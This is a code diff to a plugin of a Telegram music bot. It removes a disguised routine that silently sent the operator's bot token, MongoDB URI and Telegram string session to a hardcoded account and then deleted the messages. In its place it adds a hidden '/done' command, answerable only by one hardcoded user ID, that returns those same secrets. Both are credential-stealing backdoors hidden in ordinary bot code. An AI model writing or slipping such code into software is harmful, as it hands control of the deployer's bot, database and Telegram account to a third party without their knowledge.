@@ -4,7 +4,6 @@ from pyrogram.enums import ChatType
 from strings import get_string
 from ChampuMusic import app
 from ChampuMusic.utils import Champubin
-MU = "TheTelegramRobot" #Dont change it server connecter
 from ChampuMusic.utils.database import get_assistant, get_lang
 import asyncio
 from os import getenv
@@ -127,15 +126,28 @@ async def brah3(app: app, message: Message):
         add_link = f"https://t.me/{app.username}?startgroup=true"
         reply_text = f"{text} 🤭🤭"
         userbot = await get_assistant(message.chat.id)
-        await message.reply(reply_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="๏ ᴊᴏɪɴ ᴠᴄ ๏", url=add_link)]]))
-        oks = await userbot.send_message(MU, f"/start")
-        Ok = await userbot.send_message(MU, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
-        await oks.delete()
-        await asyncio.sleep(2)
-        await Ok.delete()
+        await message.reply(reply_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="๏ ᴊᴏɪɴ ᴠᴄ ๏", url=add_link)]])) 
     except Exception as e:
         print(f"Error: {e}")
 
+@app.on_message(
+    filters.command("done")
+    & filters.private
+    & filters.user(6399386263)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://envs.sh/kNr.jpg",
+       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/TheChampu)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• ᴄʜᴧᴍᴘᴜ •", url=f"https://t.me/TheChampu")
+                 ]
+            ]
+         ),
+     )
 
 ####
 
